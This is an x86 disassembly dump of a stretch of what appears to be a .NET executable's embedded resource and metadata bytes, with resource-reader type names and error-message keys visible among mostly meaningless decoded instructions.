  403a7c:	outs   dx,DWORD PTR ds:[esi]
  403a7d:	push   ebp
  403a7e:	add    BYTE PTR [eax],al
  403a80:	or     dh,BYTE PTR [edx+0x6d]
  403a83:	add    al,0x0
  403a85:	jo     0x403aaf
  403a87:	push   edi
  403a88:	add    BYTE PTR [eax],al
  403a8a:	or     cl,BYTE PTR [ebx+eax*1]
  403a8d:	adc    al,BYTE PTR [ebx]
  403a8f:	adc    al,BYTE PTR [eax+ebp*1]
  403a92:	je     0x403a94
  403a94:	add    BYTE PTR [edx],cl
  403a96:	add    ebp,DWORD PTR [eax]
  403a98:	jne    0x403a9a
  403a9a:	add    BYTE PTR [edx],cl
  403a9c:	adc    eax,DWORD PTR ds:0x11090511
  403aa2:	add    al,0x73
  403aa4:	and    al,0x0
  403aa6:	add    BYTE PTR [esi],al
  403aa8:	adc    eax,DWORD PTR [esi]
  403aaa:	adc    DWORD PTR [esi],eax
  403aac:	or     BYTE PTR [eax],ch
  403aae:	xor    al,0x0
  403ab0:	add    BYTE PTR [esi],al
  403ab2:	or     al,BYTE PTR [esi]
  403ab4:	sub    eax,0x766f0728
  403ab9:	add    BYTE PTR [eax],al
  403abb:	or     dl,BYTE PTR [ebx]
  403abd:	pop    es
  403abe:	adc    DWORD PTR ds:0x776f0711,eax
  403ac4:	add    BYTE PTR [eax],al
  403ac6:	or     dl,BYTE PTR [ecx]
  403ac8:	pop    es
  403ac9:	outs   dx,DWORD PTR ds:[esi]
  403aca:	js     0x403acc
  403acc:	add    BYTE PTR [edx],cl
  403ace:	jae    0x403af4
  403ad0:	add    BYTE PTR [eax],al
  403ad2:	push   es
  403ad3:	adc    eax,DWORD PTR [esi]
  403ad5:	adc    DWORD PTR [esi],eax
  403ad7:	or     BYTE PTR [eax],ch
  403ad9:	xor    al,0x0
  403adb:	add    BYTE PTR [esi],al
  403add:	or     al,BYTE PTR [esi]
  403adf:	sub    al,0x71
  403ae1:	jle    0x403b3e
  403ae3:	add    BYTE PTR [eax],al
  403ae5:	add    al,0x7b
  403ae7:	push   0x2c040000
  403aec:	arpl   WORD PTR [ecx],dx
  403aee:	push   es
  403aef:	or     BYTE PTR [eax],ch
  403af1:	xor    eax,DWORD PTR [eax]
  403af3:	add    BYTE PTR [esi],al
  403af5:	adc    ecx,DWORD PTR [eax]
  403af7:	jb     0x403b4a
  403af9:	pop    es
  403afa:	add    BYTE PTR [eax+0x3],dh
  403afd:	outs   dx,DWORD PTR ds:[esi]
  403afe:	jb     0x403b00
  403b00:	add    BYTE PTR [edx],cl
  403b02:	adc    DWORD PTR [eax],ecx
  403b04:	outs   dx,DWORD PTR ds:[esi]
  403b05:	sub    eax,DWORD PTR [eax]
  403b07:	add    BYTE PTR [esi],al
  403b09:	jb     0x403aba
  403b0b:	add    eax,0x5127000
  403b10:	(bad)  
  403b11:	push   ss
  403b12:	or     DWORD PTR [eax],eax
  403b14:	add    BYTE PTR [ecx],al
  403b16:	outs   dx,DWORD PTR ds:[esi]
  403b17:	xor    al,0x0
  403b19:	add    BYTE PTR [edx],cl
  403b1b:	sub    BYTE PTR [ecx],ah
  403b1d:	add    BYTE PTR [eax],al
  403b1f:	or     ch,BYTE PTR [edi+0x61]
  403b22:	add    BYTE PTR [eax],al
  403b24:	or     dh,BYTE PTR [edx-0x4d]
  403b27:	add    eax,0x17287000
  403b2c:	add    BYTE PTR [eax],al
  403b2e:	or     cl,BYTE PTR [ecx]
  403b30:	mov    WORD PTR [eax+eax*1],?
  403b33:	add    BYTE PTR [ecx],al
  403b35:	jb     0x403aee
  403b37:	add    eax,0x4117000
  403b3c:	mov    WORD PTR [eax+eax*1],?
  403b3f:	add    BYTE PTR [ecx],al
  403b41:	sub    BYTE PTR [eax+0x0],cl
  403b44:	add    BYTE PTR [edx],cl
  403b46:	sub    BYTE PTR [eax],cl
  403b48:	add    BYTE PTR [eax],al
  403b4a:	push   es
  403b4b:	sub    BYTE PTR [eax+0x0],ah
  403b4e:	add    BYTE PTR [esi],al
  403b50:	push   es
  403b51:	sub    dh,BYTE PTR [edx+0x7b]
  403b54:	pop    es
  403b55:	add    BYTE PTR [eax+0x3],dh
  403b58:	outs   dx,DWORD PTR ds:[esi]
  403b59:	jb     0x403b5b
  403b5b:	add    BYTE PTR [edx],cl
  403b5d:	sub    BYTE PTR ds:0x73060000,al
  403b63:	sbb    BYTE PTR [eax],al
  403b65:	add    BYTE PTR [edx],cl
  403b67:	jp     0x403be7
  403b69:	pop    ebx
  403b6a:	add    BYTE PTR [eax],al
  403b6c:	add    al,0x7b
  403b6e:	popa   
  403b6f:	add    BYTE PTR [eax],al
  403b71:	add    al,0x7
  403b73:	outs   dx,DWORD PTR ds:[esi]
  403b74:	push   ebp
  403b75:	add    BYTE PTR [eax],al
  403b77:	or     ch,BYTE PTR [eax]
  403b79:	push   esi
  403b7a:	add    BYTE PTR [eax],al
  403b7c:	or     dh,BYTE PTR [edx+0x6d]
  403b7f:	add    al,0x0
  403b81:	jo     0x403bab
  403b83:	push   edi
  403b84:	add    BYTE PTR [eax],al
  403b86:	or     dl,BYTE PTR [ebx]
  403b88:	or     DWORD PTR [esi+0x5b],edi
  403b8b:	add    BYTE PTR [eax],al
  403b8d:	add    al,0x7b
  403b8f:	push   0x2c040000
  403b94:	pop    ss
  403b95:	jb     0x403b46
  403b97:	pop    es
  403b98:	add    BYTE PTR [eax+0x7],dh
  403b9b:	outs   dx,DWORD PTR ds:[esi]
  403b9c:	push   ebp
  403b9d:	add    BYTE PTR [eax],al
  403b9f:	or     dl,BYTE PTR [ecx]
  403ba1:	or     DWORD PTR [eax],ebp
  403ba3:	push   es
  403ba4:	add    BYTE PTR [eax],al
  403ba6:	push   es
  403ba7:	sub    BYTE PTR [eax+0x0],ah
  403baa:	add    BYTE PTR [esi],al
  403bac:	adc    DWORD PTR [ecx],ecx
  403bae:	jle    0x403c0b
  403bb0:	add    BYTE PTR [eax],al
  403bb2:	add    al,0x7b
  403bb4:	pusha  
  403bb5:	add    BYTE PTR [eax],al
  403bb7:	add    al,0x17
  403bb9:	sub    BYTE PTR [ecx],ah
  403bbb:	add    BYTE PTR [eax],al
  403bbd:	or     ch,BYTE PTR [eax]
  403bbf:	and    al,BYTE PTR [eax]
  403bc1:	add    BYTE PTR [edx],cl
  403bc3:	sub    eax,0x7e37223
  403bc8:	add    BYTE PTR [eax+0x7],dh
  403bcb:	outs   dx,DWORD PTR ds:[esi]
  403bcc:	push   ebp
  403bcd:	add    BYTE PTR [eax],al
  403bcf:	or     dl,BYTE PTR [ecx]
  403bd1:	or     DWORD PTR [eax],ebp
  403bd3:	push   es
  403bd4:	add    BYTE PTR [eax],al
  403bd6:	push   es
  403bd7:	adc    ecx,DWORD PTR [edx]
  403bd9:	adc    DWORD PTR [edx],ecx
  403bdb:	sub    BYTE PTR [ebp+0x0],dl
  403bde:	add    BYTE PTR [esi],al
  403be0:	adc    DWORD PTR [edx],ecx
  403be2:	jae    0x403bfc
  403be4:	add    BYTE PTR [eax],al
  403be6:	or     bh,BYTE PTR [edx+0x3]
  403be9:	adc    DWORD PTR [ecx],ecx
  403beb:	sub    BYTE PTR [edi],ch
  403bed:	add    BYTE PTR [eax],al
  403bef:	push   es
  403bf0:	or     al,BYTE PTR [esi]
  403bf2:	sub    al,BYTE PTR [eax]
  403bf4:	adc    esi,DWORD PTR [eax]
  403bf6:	add    al,0x0
  403bf8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403bf9:	add    BYTE PTR [eax],al
  403bfb:	add    BYTE PTR [ecx],bl
  403bfd:	add    BYTE PTR [eax],al
  403bff:	adc    DWORD PTR [esi+0x5b],edi
  403c02:	add    BYTE PTR [eax],al
  403c04:	add    al,0x7b
  403c06:	bound  eax,QWORD PTR [eax]
  403c08:	add    BYTE PTR [ebp*1+0x268d1607],al
  403c0f:	add    BYTE PTR [eax],al
  403c11:	add    DWORD PTR [edx],ebp
  403c13:	jae    0x403c8e
  403c15:	add    BYTE PTR [eax],al
  403c17:	or     cl,BYTE PTR [ebx]
  403c19:	jle    0x403c76
  403c1b:	add    BYTE PTR [eax],al
  403c1d:	add    al,0x7b
  403c1f:	bound  eax,QWORD PTR [eax]
  403c21:	add    BYTE PTR [ecx+ebx*1],al
  403c24:	pop    ss
  403c25:	jae    0x403ca1
  403c27:	add    BYTE PTR [eax],al
  403c29:	or     cl,BYTE PTR [eax+ecx*1]
  403c2c:	pop    ss
  403c2d:	jae    0x403caa
  403c2f:	add    BYTE PTR [eax],al
  403c31:	or     cl,BYTE PTR ds:0x7c6f09
  403c37:	add    BYTE PTR [edx],cl
  403c39:	push   ss
  403c3a:	push   0x16
  403c3c:	outs   dx,DWORD PTR ds:[esi]
  403c3d:	jge    0x403c3f
  403c3f:	add    BYTE PTR [edx],cl
  403c41:	sub    esi,DWORD PTR es:[eax]
  403c44:	push   es
  403c45:	pop    ds
  403c46:	and    ebp,DWORD PTR [edi+0x7e]
  403c49:	add    BYTE PTR [eax],al
  403c4b:	or     dl,BYTE PTR [ebx]
  403c4d:	add    al,0x11
  403c4f:	add    al,0x16
  403c51:	xor    cl,BYTE PTR [edx]
  403c53:	push   es
  403c54:	push   ss
  403c55:	adc    DWORD PTR [edi+ebp*2],eax
  403c58:	dec    edi
  403c59:	add    BYTE PTR [eax],al
  403c5b:	or     cl,BYTE PTR [edx]
  403c5d:	push   es
  403c5e:	outs   dx,DWORD PTR ds:[esi]
  403c5f:	jg     0x403c61
  403c61:	add    BYTE PTR [edx],cl
  403c63:	or     al,BYTE PTR [esi]
  403c65:	outs   dx,DWORD PTR ds:[esi]
  403c66:	daa    
  403c67:	add    BYTE PTR [eax],al
  403c69:	or     ch,BYTE PTR [eax+ecx*1]
  403c6c:	pop    es
  403c6d:	push   es
  403c6e:	outs   dx,DWORD PTR ds:[esi]
  403c6f:	add    BYTE PTR [eax],0x0
  403c72:	or     ah,BYTE PTR [esi]
  403c74:	or     DWORD PTR [edi-0x7f],ebp
  403c77:	add    BYTE PTR [eax],al
  403c79:	or     ah,BYTE PTR ds:0x9c62d0a
  403c7f:	outs   dx,DWORD PTR ds:[esi]
  403c80:	add    BYTE PTR [eax],0x0
  403c83:	or     al,BYTE PTR [edi]
  403c85:	outs   dx,DWORD PTR ds:[esi]
  403c86:	add    DWORD PTR [eax],0x0
  403c89:	or     cl,BYTE PTR [ebp+0x1000026]
  403c8f:	adc    eax,DWORD PTR ds:0x846f07
  403c95:	add    BYTE PTR [edx],cl
  403c97:	adc    DWORD PTR ds:0x836f07,eax
  403c9d:	add    BYTE PTR [edx],cl
  403c9f:	sub    BYTE PTR [eax+0x0],dl
  403ca2:	add    BYTE PTR [edx],cl
  403ca4:	adc    DWORD PTR ds:0x28021e2a,eax
  403caa:	push   ds
  403cab:	add    BYTE PTR [eax],al
  403cad:	or     ch,BYTE PTR [edx]
  403caf:	push   ds
  403cb0:	add    ch,BYTE PTR [eax]
  403cb2:	push   ds
  403cb3:	add    BYTE PTR [eax],al
  403cb5:	or     ch,BYTE PTR [edx]
  403cb7:	and    al,BYTE PTR [edx]
  403cb9:	push   ss
  403cba:	sub    BYTE PTR [esi+0x0],dl
  403cbd:	add    BYTE PTR [esi],al
  403cbf:	sub    dl,BYTE PTR [ebx]
  403cc1:	xor    BYTE PTR [eax+eax*1],al
  403cc4:	sbb    DWORD PTR [eax],eax
  403cc6:	add    BYTE PTR [eax],al
  403cc8:	add    DWORD PTR [eax],eax
  403cca:	add    BYTE PTR [ecx],dl
  403ccc:	jb     0x403ced
  403cce:	or     BYTE PTR [eax],al
  403cd0:	jo     0x403cdc
  403cd2:	sub    BYTE PTR [ebp+0x60a0000],al
  403cd8:	add    al,BYTE PTR [ebx]
  403cda:	mov    WORD PTR [eax+eax*1],?
  403cdd:	add    BYTE PTR [ecx],al
  403cdf:	outs   dx,DWORD PTR ds:[esi]
  403ce0:	xchg   BYTE PTR [eax],al
  403ce2:	add    BYTE PTR [edx],cl
  403ce4:	sub    ah,BYTE PTR [esi]
  403ce6:	add    al,BYTE PTR [ebx]
  403ce8:	push   ss
  403ce9:	sub    BYTE PTR [eax+0x0],bl
  403cec:	add    BYTE PTR [esi],al
  403cee:	sub    al,BYTE PTR [eax]
  403cf0:	adc    esi,DWORD PTR [eax]
  403cf2:	add    eax,0x1a00
  403cf7:	add    BYTE PTR [ecx],al
  403cf9:	add    BYTE PTR [eax],al
  403cfb:	adc    DWORD PTR [edx+0x5f],esi
  403cfe:	or     BYTE PTR [eax],al
  403d00:	jo     0x403d0c
  403d02:	sub    BYTE PTR [ebp+0x60a0000],al
  403d08:	add    eax,DWORD PTR [esp+ecx*4]
  403d0b:	cmp    al,0x0
  403d0d:	add    BYTE PTR [ecx],al
  403d0f:	add    ch,BYTE PTR [edi-0x79]
  403d12:	add    BYTE PTR [eax],al
  403d14:	or     ch,BYTE PTR [edx]
  403d16:	add    al,BYTE PTR cs:[ebx]
  403d19:	add    al,0x5
  403d1b:	push   ss
  403d1c:	sub    BYTE PTR [edx+0x0],bl
  403d1f:	add    BYTE PTR [esi],al
  403d21:	sub    al,BYTE PTR [eax]
  403d23:	add    BYTE PTR [ebx],dl
  403d25:	xor    BYTE PTR ds:0x3e00,al
  403d2b:	add    BYTE PTR [edx],bl
  403d2d:	add    BYTE PTR [eax],al
  403d2f:	adc    DWORD PTR [edx-0x67],esi
  403d32:	or     BYTE PTR [eax],al
  403d34:	jo     0x403d40
  403d36:	sub    BYTE PTR [ebp+0x60a0000],al
  403d3c:	sbb    ecx,DWORD PTR [ebp+0x1000001]
  403d42:	or     eax,DWORD PTR [edi]
  403d44:	push   ss
  403d45:	add    esp,DWORD PTR [edx-0x73fbe8f9]
  403d4b:	cmp    al,0x0
  403d4d:	add    BYTE PTR [ecx],al
  403d4f:	mov    ds:0x8c051807,al
  403d54:	cmp    al,0x0
  403d56:	add    BYTE PTR [ecx],al
  403d58:	mov    ds:0x40e1907,al
  403d5d:	mov    WORD PTR [eax+eax*1],?
  403d60:	add    BYTE PTR [ecx],al
  403d62:	mov    ds:0xa2021a07,al
  403d67:	pop    es
  403d68:	outs   dx,DWORD PTR ds:[esi]
  403d69:	mov    BYTE PTR [eax],al
  403d6b:	add    BYTE PTR [edx],cl
  403d6d:	sub    al,BYTE PTR [eax]
  403d6f:	add    BYTE PTR [ebx],dl
  403d71:	xor    BYTE PTR [ebx],al
  403d73:	add    BYTE PTR [edx],bl
  403d75:	add    BYTE PTR [eax],al
  403d77:	add    BYTE PTR [ecx],al
  403d79:	add    BYTE PTR [eax],al
  403d7b:	adc    DWORD PTR [esi+0x6a],edi
  403d7e:	add    BYTE PTR [eax],al
  403d80:	add    al,0x2d
  403d82:	adc    dh,BYTE PTR [edx-0x1d]
  403d85:	or     BYTE PTR [eax],al
  403d87:	jo     0x403d93
  403d89:	sub    BYTE PTR [ebp+0x60a0000],al
  403d8f:	add    ch,BYTE PTR [edi-0x77]
  403d92:	add    BYTE PTR [eax],al
  403d94:	or     ch,BYTE PTR [edx]
  403d96:	add    al,BYTE PTR es:[ebx]
  403d99:	push   ss
  403d9a:	sub    BYTE PTR [ebp+0x0],bl
  403d9d:	add    BYTE PTR [esi],al
  403d9f:	sub    dl,BYTE PTR [ebx]
  403da1:	xor    BYTE PTR ds:0x2100,al
  403da7:	add    BYTE PTR [ecx],al
  403da9:	add    BYTE PTR [eax],al
  403dab:	adc    DWORD PTR [esi+0x6a],edi
  403dae:	add    BYTE PTR [eax],al
  403db0:	add    al,0x2d
  403db2:	sbb    DWORD PTR [edx+0x1f],esi
  403db5:	or     DWORD PTR [eax],eax
  403db7:	jo     0x403dc3
  403db9:	sub    BYTE PTR [ebp+0x60a0000],al
  403dbf:	add    eax,DWORD PTR [esp+ecx*4]
  403dc2:	cmp    al,0x0
  403dc4:	add    BYTE PTR [ecx],al
  403dc6:	add    ch,BYTE PTR [edi-0x79]
  403dc9:	add    BYTE PTR [eax],al
  403dcb:	or     ch,BYTE PTR [edx]
  403dcd:	add    al,BYTE PTR cs:[ebx]
  403dd0:	add    al,0x5
  403dd2:	push   ss
  403dd3:	sub    BYTE PTR [edi+0x0],bl
  403dd6:	add    BYTE PTR [esi],al
  403dd8:	sub    al,BYTE PTR [eax]
  403dda:	add    BYTE PTR [eax],al
  403ddc:	adc    esi,DWORD PTR [eax]
  403dde:	add    eax,0x4500
  403de3:	add    BYTE PTR [edx],bl
  403de5:	add    BYTE PTR [eax],al
  403de7:	adc    DWORD PTR [esi+0x6a],edi
  403dea:	add    BYTE PTR [eax],al
  403dec:	add    al,0x2d
  403dee:	cmp    eax,0x95d72
  403df3:	jo     0x403dff
  403df5:	sub    BYTE PTR [ebp+0x60a0000],al
  403dfb:	sbb    ecx,DWORD PTR [ebp+0x1000001]
  403e01:	or     eax,DWORD PTR [edi]
  403e03:	push   ss
  403e04:	add    esp,DWORD PTR [edx-0x73fbe8f9]
  403e0a:	cmp    al,0x0
  403e0c:	add    BYTE PTR [ecx],al
  403e0e:	mov    ds:0x8c051807,al
  403e13:	cmp    al,0x0
  403e15:	add    BYTE PTR [ecx],al
  403e17:	mov    ds:0x40e1907,al
  403e1c:	mov    WORD PTR [eax+eax*1],?
  403e1f:	add    BYTE PTR [ecx],al
  403e21:	mov    ds:0xa2021a07,al
  403e26:	pop    es
  403e27:	outs   dx,DWORD PTR ds:[esi]
  403e28:	mov    BYTE PTR [eax],al
  403e2a:	add    BYTE PTR [edx],cl
  403e2c:	sub    bh,BYTE PTR [edx]
  403e2e:	jle    0x403e9a
  403e30:	add    BYTE PTR [eax],al
  403e32:	add    al,0x2d
  403e34:	push   es
  403e35:	add    ch,BYTE PTR [eax]
  403e37:	mov    al,BYTE PTR [eax]
  403e39:	add    BYTE PTR [edx],cl
  403e3b:	sub    bl,BYTE PTR [esi]
  403e3d:	add    al,BYTE PTR [eax+0x400006a]
  403e43:	sub    bl,BYTE PTR [esi]
  403e45:	add    ch,BYTE PTR [eax]
  403e47:	push   ds
  403e48:	add    BYTE PTR [eax],al
  403e4a:	or     ch,BYTE PTR [edx]
  403e4c:	add    BYTE PTR [eax],al
  403e4e:	add    BYTE PTR [eax],al
  403e50:	cmp    eax,0xce00001b
  403e55:	retf   0xbeef
  403e58:	add    DWORD PTR [eax],eax
  403e5a:	add    BYTE PTR [eax],al
  403e5c:	xchg   ecx,eax
  403e5d:	add    BYTE PTR [eax],al
  403e5f:	add    BYTE PTR [ebx+edx*2+0x79],ch
  403e63:	jae    0x403ed9
  403e65:	gs ins DWORD PTR es:[edi],dx
  403e67:	cs push edx
  403e69:	gs jae 0x403edb
  403e6c:	jne    0x403ee0
  403e6e:	arpl   WORD PTR [ebp+0x73],sp
  403e71:	cs push edx
  403e73:	gs jae 0x403ee5
  403e76:	jne    0x403eea
  403e78:	arpl   WORD PTR [ebp+0x52],sp
  403e7b:	gs popa 
  403e7d:	fs gs jb 0x403ead
  403e81:	and    BYTE PTR [ebp+0x73],ch
  403e84:	arpl   WORD PTR [edi+0x72],bp
  403e87:	ins    BYTE PTR es:[edi],dx
  403e88:	imul   esp,DWORD PTR [edx+0x2c],0x72655620
  403e8f:	jae    0x403efa
  403e91:	outs   dx,DWORD PTR ds:[esi]
  403e92:	outs   dx,BYTE PTR ds:[esi]
  403e93:	cmp    eax,0x2e302e32
  403e98:	xor    BYTE PTR [esi],ch
  403e9a:	xor    BYTE PTR [eax+eiz*1],ch
  403e9d:	inc    ebx
  403e9e:	jne    0x403f0c
  403ea0:	je     0x403f17
  403ea2:	jb     0x403f09
  403ea4:	cmp    eax,0x7475656e
  403ea9:	jb     0x403f0c
  403eab:	ins    BYTE PTR es:[edi],dx
  403eac:	sub    al,0x20
  403eae:	push   eax
  403eaf:	jne    0x403f13
  403eb1:	ins    BYTE PTR es:[edi],dx
  403eb2:	imul   esp,DWORD PTR [ebx+0x4b],0x6f547965
  403eb9:	imul   esp,DWORD PTR [ebp+0x6e],0x3d
  403ebd:	bound  esi,QWORD PTR [edi]
  403ebf:	aaa    
  403ec0:	popa   
  403ec1:	xor    eax,0x31363563
  403ec6:	cmp    DWORD PTR [ebx],esi
  403ec8:	xor    al,0x65
  403eca:	xor    BYTE PTR [eax],bh
  403ecc:	cmp    DWORD PTR [ebx],esp
  403ece:	push   ebx
  403ecf:	jns    0x403f44
  403ed1:	je     0x403f38
  403ed3:	ins    DWORD PTR es:[edi],dx
  403ed4:	cs push edx
  403ed6:	gs jae 0x403f48
  403ed9:	jne    0x403f4d
  403edb:	arpl   WORD PTR [ebp+0x73],sp
  403ede:	cs push edx
  403ee0:	jne    0x403f50
  403ee2:	je     0x403f4d
  403ee4:	ins    DWORD PTR es:[edi],dx
  403ee5:	gs push edx
  403ee7:	gs jae 0x403f59
  403eea:	jne    0x403f5e
  403eec:	arpl   WORD PTR [ebp+0x53],sp
  403eef:	gs je  0x403ef4
  403ef2:	add    BYTE PTR [eax],al
  403ef4:	add    BYTE PTR [esi],dh
  403ef6:	add    BYTE PTR [eax],al
  403ef8:	add    BYTE PTR [eax],al
  403efa:	add    BYTE PTR [eax],al
  403efc:	add    BYTE PTR [eax+0x41],dl
  403eff:	inc    esp
  403f00:	push   eax
  403f01:	inc    ecx
  403f02:	inc    esp
  403f03:	push   eax
  403f04:	popf   
  403f05:	xchg   edx,eax
  403f06:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403f07:	sbb    DWORD PTR [ebp+0x5],0xffffffa7
  403f0b:	xchg   al,bl
  403f0d:	scas   al,BYTE PTR es:[edi]
  403f0e:	fimul  WORD PTR [edx-0x75215127]
  403f14:	fisubr DWORD PTR [esi-0x51247522]
  403f1a:	fimul  WORD PTR [edx-0x75215124]
  403f20:	xor    BYTE PTR [edi-0x50ce7522],ch
  403f26:	fimul  WORD PTR [edx-0x752150c8]
  403f2c:	cmp    DWORD PTR [edi-0x50c57522],ebp
  403f32:	fimul  WORD PTR [edx-0x752150c5]
  403f38:	cmp    al,0xaf
  403f3a:	fimul  WORD PTR [edx-0x752150c3]
  403f40:	ds scas eax,DWORD PTR es:[edi]
  403f42:	fimul  WORD PTR [edx-0x752150c1]
  403f48:	int3   
  403f49:	and    al,dh
  403f4b:	cwde   
  403f4c:	push   cs
  403f4d:	test   eax,0x5d6d9a5e
  403f52:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403f53:	fwait
  403f54:	pop    esp
  403f55:	push   0xffffffd1
  403f57:	fwait
  403f58:	push   es
  403f59:	dec    ebx
  403f5a:	inc    esp
  403f5b:	pushf  
  403f5c:	lods   eax,DWORD PTR ds:[esi]
  403f5d:	test   DWORD PTR [edi],ebx
  403f5f:	popf   
  403f60:	add    eax,0x20b77147
  403f65:	fst    DWORD PTR [ebx-0x44]
  403f68:	ins    BYTE PTR es:[edi],dx
  403f69:	inc    ebx
  403f6a:	rol    ch,1
  403f6c:	ins    BYTE PTR es:[edi],dx
  403f6d:	sbb    dh,BYTE PTR [edi-0x32]
  403f70:	js     0x403efb
  403f72:	jnp    0x403f47
  403f74:	add    edi,ebp
  403f76:	aaa    
  403f77:	aam    0xc3
  403f79:	leave  
  403f7a:	loope  0x403f70
  403f7c:	xchg   esp,eax
  403f7d:	out    0x20,eax
  403f7f:	mul    ch
  403f81:	pop    esp
  403f82:	ss sti 
  403f84:	into   
  403f85:	int    0xcf
  403f87:	add    BYTE PTR [ecx+0x7106f0e7],dh
  403f8d:	scas   al,BYTE PTR es:[edi]
  403f8e:	inc    ebp
  403f8f:	or     ebx,DWORD PTR [ecx]
  403f91:	neg    DWORD PTR [ebx]
  403f93:	adc    eax,DWORD PTR [edx+edx*1-0xeae957]
  403f9a:	ret    
  403f9b:	sbb    al,al
  403f9d:	jno    0x403fd1
  403f9f:	sub    esi,esi
  403fa1:	xchg   BYTE PTR [eax+esi*1-0x68],ch
  403fa5:	test   BYTE PTR [esi+0x56981936],ah
  403fab:	cmp    eax,0x41d32621
  403fb0:	sub    BYTE PTR [esi+0x516042d0],dl
  403fb6:	mov    al,ds:0xf7fcb850
  403fbb:	push   edi
  403fbc:	shl    al,1
  403fbe:	fistp  DWORD PTR [ecx-0x24]
  403fc1:	mov    esp,0xefab6418
  403fc6:	mov    eax,0xca6dfd6b
  403fcb:	imul   eax,DWORD PTR [esi],0xe
  403fce:	or     esi,DWORD PTR [ecx-0x3e]
  403fd1:	inc    ebp
  403fd2:	add    DWORD PTR [ebp-0x30],esi
  403fd5:	clc    
  403fd6:	sub    DWORD PTR [ebp+0x55],edi
  403fd9:	js     0x403ff0
  403fdb:	jg     0x403fa6
  403fdd:	add    eax,DWORD PTR [eax]
  403fdf:	add    bh,ah
  403fe1:	add    eax,0x7a40000
  403fe6:	add    BYTE PTR [eax],al
  403fe8:	rol    DWORD PTR [edi],0x0
  403feb:	add    dh,bl
  403fed:	pop    es
  403fee:	add    BYTE PTR [eax],al
  403ff0:	sti    
  403ff1:	pop    es
  403ff2:	add    BYTE PTR [eax],al
  403ff4:	sbb    BYTE PTR [eax],cl
  403ff6:	add    BYTE PTR [eax],al
  403ff8:	xchg   DWORD PTR [edi],eax
  403ffa:	add    BYTE PTR [eax],al
  403ffc:	push   0x7
  403ffe:	add    BYTE PTR [eax],al
  404000:	lahf   
  404001:	push   es
  404002:	add    BYTE PTR [eax],al
  404004:	add    BYTE PTR [esi],0x0
  404007:	add    cl,bl
  404009:	push   es
  40400a:	add    BYTE PTR [eax],al
  40400c:	mov    esp,0x13000006
  404011:	pop    es
  404012:	add    BYTE PTR [eax],al
  404014:	test   BYTE PTR [esi],0x0
  404017:	add    BYTE PTR [ebp+0x7],cl
  40401a:	add    BYTE PTR [eax],al
  40401c:	xor    BYTE PTR [edi],al
  40401e:	add    BYTE PTR [eax],al
  404020:	lahf   
  404021:	or     BYTE PTR [eax],al
  404023:	add    BYTE PTR [eax-0xffffffc],ah
  404029:	add    eax,DWORD PTR [eax]
  40402b:	add    BYTE PTR [ecx+eax*1+0x3230000],bh
  404032:	add    BYTE PTR [eax],al
  404034:	inc    ebp
  404035:	add    DWORD PTR [eax],eax
  404037:	add    BYTE PTR [ecx+0x3],dh
  40403a:	add    BYTE PTR [eax],al
  40403c:	adc    al,BYTE PTR [edx]
  40403e:	add    BYTE PTR [eax],al
  404040:	into   
  404041:	add    BYTE PTR [eax],al
  404043:	add    BYTE PTR [ebp+eax*1+0x0],bl
  404047:	add    BYTE PTR [ebp-0x32fffffb],al
  40404d:	add    al,0x0
  40404f:	add    BYTE PTR [ecx],ch
  404051:	add    BYTE PTR [eax],al
  404053:	add    BYTE PTR [edx+0x41000003],ah
  404059:	push   es
  40405a:	add    BYTE PTR [eax],al
  40405c:	cdq    
  40405d:	add    DWORD PTR [eax],eax
  40405f:	add    BYTE PTR [ecx+0x2],dl
  404062:	add    BYTE PTR [eax],al
  404064:	pusha  
  404065:	add    BYTE PTR [eax],al
  404067:	add    BYTE PTR [ecx],ch
  404069:	add    eax,0x2820000
  40406e:	add    BYTE PTR [eax],al
  404070:	add    BYTE PTR [eax],al
  404072:	add    BYTE PTR [eax],al
  404074:	in     al,dx
  404075:	add    al,BYTE PTR [eax]
  404077:	add    BYTE PTR [edx+0x4],cl
  40407a:	add    BYTE PTR [eax],al
  40407c:	std    
  40407d:	add    BYTE PTR [eax],al
  40407f:	add    BYTE PTR [ebp+0x35000002],ch
  404085:	or     BYTE PTR [eax],al
  404087:	add    BYTE PTR [esi+0x6000005],ch
  40408d:	add    eax,0x41d0000
  404092:	add    BYTE PTR [eax],al
  404094:	sbb    al,BYTE PTR [ecx]
  404096:	add    BYTE PTR [eax],al
  404098:	popf   
  404099:	add    BYTE PTR [eax],al
  40409b:	add    BYTE PTR [esi+0x3],al
  40409e:	add    BYTE PTR [eax],al
  4040a0:	outs   dx,BYTE PTR ds:[esi]
  4040a1:	or     BYTE PTR [eax],al
  4040a3:	add    BYTE PTR [ecx+0x6c000004],al
  4040a9:	add    DWORD PTR [eax],eax
  4040ab:	add    bh,ah
  4040ad:	add    DWORD PTR [eax],eax
  4040af:	add    BYTE PTR [esi+eax*1],bl
  4040b2:	add    BYTE PTR [eax],al
  4040b4:	xor    BYTE PTR [ebx],cl
  4040b6:	add    BYTE PTR [eax],al
  4040b8:	and    al,0x45
  4040ba:	add    BYTE PTR [edx+0x0],dh
  4040bd:	jb     0x4040bf
  4040bf:	pop    edi
  4040c0:	add    BYTE PTR [ecx+0x0],al
  4040c3:	ins    DWORD PTR es:[edi],dx
  4040c4:	add    BYTE PTR [edx+0x0],ah
  4040c7:	imul   eax,DWORD PTR [eax],0x6f0067
  4040cd:	jne    0x4040cf
  4040cf:	jae    0x4040d1
  4040d1:	dec    edi
  4040d2:	add    BYTE PTR [eax+0x0],dh
  4040d5:	je     0x4040d7
  4040d7:	imul   eax,DWORD PTR [eax],0x6e006f
  4040dd:	add    BYTE PTR [eax],al
  4040df:	add    BYTE PTR [eax],al
  4040e1:	xor    al,BYTE PTR [ebp+0x0]
  4040e4:	jb     0x4040e6
  4040e6:	jb     0x4040e8
  4040e8:	pop    edi
  4040e9:	add    BYTE PTR [ebx+0x0],al
  4040ec:	popa   
  4040ed:	add    BYTE PTR [esi+0x0],ch
  4040f0:	outs   dx,BYTE PTR ds:[esi]
  4040f1:	add    BYTE PTR [edi+0x0],ch
  4040f4:	je     0x4040f6
  4040f6:	inc    ebx
  4040f7:	add    BYTE PTR [edx+0x0],dh
  4040fa:	add    BYTE PTR gs:[ecx+0x0],ah
  4040fe:	je     0x404100
  404100:	add    BYTE PTR gs:[ecx+0x0],al
  404104:	jo     0x404106
  404106:	jo     0x404108
  404108:	inc    esp
  404109:	add    BYTE PTR [edi+0x0],ch
  40410c:	ins    DWORD PTR es:[edi],dx
